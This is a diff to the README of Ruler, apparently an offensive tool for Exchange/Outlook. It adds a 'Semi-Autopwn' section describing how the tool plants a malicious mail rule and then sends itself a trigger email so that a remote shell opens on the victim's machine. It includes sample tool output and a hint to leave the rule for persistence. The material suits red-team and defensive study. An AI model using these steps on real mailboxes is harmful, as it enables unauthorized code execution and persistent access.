@@ -173,6 +173,30 @@ Rule: shell RuleID: 01000000127380b1
 
 You should now be able to send an email to your target with the trigger string in the subject line. From testing the mailrule is synchronised across nearly instantaniously, so in most cases you should be able to get a shell almost immediatly, assuming outlook is open and connected.
 
+# Semi-Autopwn
+
+If you want to automate the triggering of the rule, Ruler is able to create a new message in the user's inbox, using their own email address. This means you no longer need to send an email to your target. Simply use the ```-send``` flag when creating your rule, and Ruler will wait 30seconds for your rules to synchronise (adjust this in the source if you think 30s is too long/short) and then send an email via MAPI.
+
+```
+[*] Retrieving MAPI/HTTP info
+[*] Doing Autodiscover for domain
+[*] Autodiscover step 0 - URL: https://outlook.com/autodiscover/autodiscover.xml
+[+] MAPI URL found:  https://outlook.office365.com/mapi/emsmdb/?MailboxId=0003bffd-fef9-fb24-0000-000000000000@outlook.com
+[+] User DN:  /o=First Organization/ou=Exchange Administrative Group(FYDIBOHF23SPDLT)/cn=Recipients/cn=0003BFFDFEF9FB24
+[*] Got Context, Doing ROPLogin
+[*] And we are authenticated
+[+] Mailbox GUID: dc561d32a809304b8dbc91cc9f0ae1e2
+[*] Openning the Inbox
+[*] Adding Rule
+[*] Rule Added. Fetching list of rules...
+[+] Found 1 rules
+Rule: autopop RuleID: 010000000c4baa84
+[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)
+[*] Sending email
+[*] Message sent, your shell should trigger shortly.
+[*] And disconnecting from server
+```
+
 Enjoy your shell and don't forget to clean-up after yourself by deleting the rule (or leave it for persistence).
 
 [Silentbreak blog]: <https://silentbreaksecurity.com/malicious-outlook-rules/>
